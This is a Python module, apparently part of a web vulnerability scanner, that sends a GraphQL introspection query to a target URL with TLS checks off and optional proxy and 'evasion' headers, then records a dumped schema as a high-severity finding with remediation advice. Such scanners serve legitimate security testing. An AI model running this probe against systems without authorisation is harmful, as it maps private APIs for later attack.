import aiohttp
import asyncio
import json

async def exploit_graphql_dump(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts to dump GraphQL Introspection Schema.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    introspection_query = """
    query {
      __schema {
        types {
          name
          kind
          fields {
            name
          }
        }
      }
    }
    """
    
    # URL is likely /graphql
    try:
        if log_callback: log_callback(f"   üêô GraphQL Dumper: Sending Introspection Query to {url}...")
        
        # Merge content-type
        if "Content-Type" not in final_headers:
             final_headers["Content-Type"] = "application/json"
        
        payload = {"query": introspection_query}
        
        async with aiohttp.ClientSession() as session:
             async with session.post(url, json=payload, headers=final_headers, timeout=10, ssl=False, proxy=proxy) as resp:
                 if resp.status == 200:
                     data = await resp.json()
                     # Valid introspection result usually has data.__schema
                     if "data" in data and "__schema" in data["data"]:
                         schema_summary = json.dumps(data)[0:500] + "..."
                         
                         findings.append({
                            "type": "GraphQL Introspection Enabled",
                            "severity": "High",
                            "detail": "Successfully dumped GraphQL Schema.",
                            "evidence": f"Excerpt: {schema_summary}",
                            "remediation": "Disable introspection in production."
                        })
    except: pass
    
    return findings
